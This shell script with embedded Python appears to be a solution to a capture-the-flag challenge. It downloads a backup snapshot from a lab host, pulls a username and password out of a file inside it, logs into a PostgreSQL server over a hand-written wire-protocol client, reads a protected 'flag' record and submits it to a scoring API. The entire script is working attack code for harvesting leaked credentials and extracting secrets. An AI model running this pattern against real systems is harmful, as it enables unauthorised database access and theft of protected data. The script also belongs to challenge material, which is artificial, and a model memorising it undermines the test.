#!/bin/sh
set -eu

workdir="$(mktemp -d)"
trap 'rm -rf "$workdir"' EXIT
curl -fsS http://172.20.0.141:8080/snapshots/station-maintenance.tar.gz -o "$workdir/snapshot.tar.gz"

flag="$(python3 - "$workdir/snapshot.tar.gz" <<'PY'
import hashlib
import socket
import struct
import sys
import tarfile

archive_path = sys.argv[1]
with tarfile.open(archive_path, "r:gz") as archive:
    content = archive.extractfile("rotation.txt").read().decode()
credentials = dict(line.split("=", 1) for line in content.splitlines() if "=" in line)
user = credentials["username"]
password = credentials["password"]

host, port = "172.20.0.142", 5432
sock = socket.create_connection((host, port), timeout=5)
sock.settimeout(5)

def read_exact(length):
    data = b""
    while len(data) < length:
        chunk = sock.recv(length - len(data))
        if not chunk:
            raise RuntimeError("database closed the connection")
        data += chunk
    return data

def read_message():
    kind = read_exact(1)
    size = struct.unpack("!I", read_exact(4))[0]
    return kind, read_exact(size - 4)

def send_message(kind, payload):
    sock.sendall(kind + struct.pack("!I", len(payload) + 4) + payload)

params = b"user\0" + user.encode() + b"\0database\0airlock\0client_encoding\0UTF8\0\0"
sock.sendall(struct.pack("!I", len(params) + 8) + struct.pack("!I", 196608) + params)
while True:
    kind, payload = read_message()
    if kind == b"R":
        auth_code = struct.unpack("!I", payload[:4])[0]
        if auth_code == 0:
            continue
        if auth_code != 5:
            raise RuntimeError("unexpected database authentication method")
        salt = payload[4:8]
        inner = hashlib.md5((password + user).encode()).hexdigest().encode()
        response = "md5" + hashlib.md5(inner + salt).hexdigest()
        send_message(b"p", response.encode() + b"\0")
    elif kind == b"E":
        raise RuntimeError(payload.decode(errors="replace"))
    elif kind == b"Z":
        break

send_message(b"Q", b"SELECT flag FROM airlock_secrets WHERE record_name = 'sealed_airlock_record';\0")
result = None
while True:
    kind, payload = read_message()
    if kind == b"D":
        count = struct.unpack("!H", payload[:2])[0]
        offset = 2
        values = []
        for _ in range(count):
            size = struct.unpack("!i", payload[offset:offset + 4])[0]
            offset += 4
            values.append(payload[offset:offset + size])
            offset += size
        result = values[0].decode()
    elif kind == b"E":
        raise RuntimeError(payload.decode(errors="replace"))
    elif kind == b"Z":
        break
sock.close()
if not result:
    raise RuntimeError("protected record was empty")
print(result)
PY
)"

python3 -c 'import json,sys; print(json.dumps({"challenge_id":"scl-challenge-frame-b4ad14","task_id":"task1","flag":sys.argv[1]}))' "$flag" | curl -s http://172.20.0.3/api/challenges/submit -X POST -H 'Content-Type: application/json' --data-binary @-
